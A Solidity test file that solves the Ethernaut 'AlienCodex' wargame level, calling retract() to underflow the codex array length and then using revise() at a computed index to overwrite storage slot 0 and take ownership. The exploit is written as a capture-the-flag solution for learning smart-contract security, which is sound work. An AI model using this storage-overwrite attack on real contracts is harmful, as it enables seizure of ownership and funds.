// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "ds-test/test.sol";

import "src/core/Ethernaut-05.sol";
import "src/levels/19-AlienCodex/AlienCodexFactory.sol";
// import "src/levels/19-AlienCodex/AttackAlienCodex.sol";

contract AlienCodexTest is DSTest {
    Ethernaut ethernaut;
    address hacker = address(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testAlienCodexHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        AlienCodexFactory alienCodexFactory = new AlienCodexFactory();
        ethernaut.registerLevel(alienCodexFactory);
        address levelAddress = ethernaut.createLevelInstance(alienCodexFactory);
        AlienCodex ethernautAlienCodex = AlienCodex(address(uint160(address(levelAddress))));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        ethernautAlienCodex.make_contact();
        // change the codex's length to 2^256, then we can access any slot of the contract.
        ethernautAlienCodex.retract();

        // the codex is a dynamic array located in slot 1 of the contract
        // the actual data stored in the codex begins at the location keccak256(1)
        uint256 idx = (2 ** 256 - 1) - uint256(keccak256(abi.encode(1))) + 1;
        bytes32 content = bytes32(uint256(uint160(address(this))));

        ethernautAlienCodex.revise(idx, content);
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(address(uint160(address(levelAddress))));
        assert(levelSuccessfullyPassed);
    }
}
